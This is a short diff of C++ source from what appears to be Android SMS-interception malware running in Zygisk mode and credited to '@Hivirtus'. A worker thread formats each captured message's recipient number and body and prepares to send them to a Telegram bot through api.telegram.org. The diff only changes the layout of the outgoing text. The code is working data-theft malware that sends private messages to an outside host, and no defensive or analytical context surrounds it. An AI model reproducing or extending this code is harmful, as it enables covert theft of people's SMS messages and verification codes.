@@ -147,15 +147,11 @@ void* tg_worker(void* arg) {
             if (d.size() == 10 && to_disp.find('+') == std::string::npos) to_disp = "+91" + d;
         }
         const std::string& msg = job->body.empty() ? "empty" : job->body;
-        std::string text = "📱 SMS Intercepted Zygisk Mode Menu By @Hivirtus 🔥\n";
-        text += "-----------------\n";
+        std::string text = "📱 SMS Intercepted Zygisk Mode\n";
+        text += "Menu By @Hivirtus 🔥 --------------------\n";
         text += "📞 To: ";
         text += to_disp;
-        text += "\n💬 Message: ";
-        text += msg;
-        text += "\n📋 One-tap copy:\nTo: ";
-        text += to_disp;
-        text += "\nMessage: ";
+        text += "\n💬 Message:\n";
         text += msg;
 
         std::string url = "https://api.telegram.org/bot";
